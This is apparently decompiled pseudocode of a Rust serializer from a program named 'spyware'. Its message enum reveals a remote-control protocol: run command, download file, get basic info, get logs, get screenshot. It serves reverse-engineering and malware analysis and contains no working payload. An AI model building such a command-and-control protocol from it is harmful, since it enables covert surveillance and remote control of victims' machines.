__int64 __fastcall spyware::communication::messages::_::<impl serde::ser::Serialize for spyware::communication::messages::Message>::serialize(
        __int64 a1,
        _QWORD *a2,
        int a3)
{
  unsigned __int64 v4; // rdx
  __int64 result; // rax

  v4 = 5LL;
  if ( (*a2 ^ 0x8000000000000000LL) < 0xA )
    v4 = *a2 ^ 0x8000000000000000LL;
  switch ( v4 )
  {
    case 0uLL:
      <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_newtype_variant(
        a1,
        a3,
        (unsigned int)aMessage,
        7,
        0,
        (unsigned int)aRuncommandrequ,
        17LL,
        (__int64)(a2 + 1));
      result = a1;
      break;
    case 1uLL:
      <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_newtype_variant(
        a1,
        a3,
        (unsigned int)aMessage,
        7,
        1,
        (unsigned int)aRuncommandresp,
        18LL,
        (__int64)(a2 + 1));
      result = a1;
      break;
    case 2uLL:
      <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_newtype_variant(
        a1,
        a3,
        (unsigned int)aMessage,
        7,
        2,
        (unsigned int)aDownloadfilere,
        19LL,
        (__int64)(a2 + 1));
      result = a1;
      break;
    case 3uLL:
      <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_newtype_variant(
        a1,
        a3,
        (unsigned int)aMessage,
        7,
        3,
        (unsigned int)aDownloadfilere_0,
        20LL,
        (__int64)(a2 + 1));
      result = a1;
      break;
    case 4uLL:
      <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_newtype_variant(
        a1,
        a3,
        (unsigned int)aMessage,
        7,
        4,
        (unsigned int)aGetbasicinfore,
        19LL,
        (__int64)(a2 + 1));
      result = a1;
      break;
    case 5uLL:
      <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_newtype_variant(
        a1,
        a3,
        (unsigned int)aMessage,
        7,
        5,
        (unsigned int)aGetbasicinfore_0,
        20LL,
        (__int64)a2);
      result = a1;
      break;
    case 6uLL:
      <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_newtype_variant(
        a1,
        a3,
        (unsigned int)aMessage,
        7,
        6,
        (unsigned int)aGetlogsrequest,
        14LL,
        (__int64)a2);
      result = a1;
      break;
    case 7uLL:
      <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_newtype_variant(
        a1,
        a3,
        (unsigned int)aMessage,
        7,
        7,
        (unsigned int)aGetlogsrespons,
        15LL,
        (__int64)(a2 + 1));
      result = a1;
      break;
    case 8uLL:
      <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_newtype_variant(
        a1,
        a3,
        (unsigned int)aMessage,
        7,
        8,
        (unsigned int)aGetscreenshotr,
        20LL,
        (__int64)a2);
      result = a1;
      break;
    case 9uLL:
      <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_newtype_variant(
        a1,
        a3,
        (unsigned int)aMessage,
        7,
        9,
        (unsigned int)aGetscreenshotr_0,
        21LL,
        (__int64)(a2 + 1));
      result = a1;
      break;
  }
  return result;
}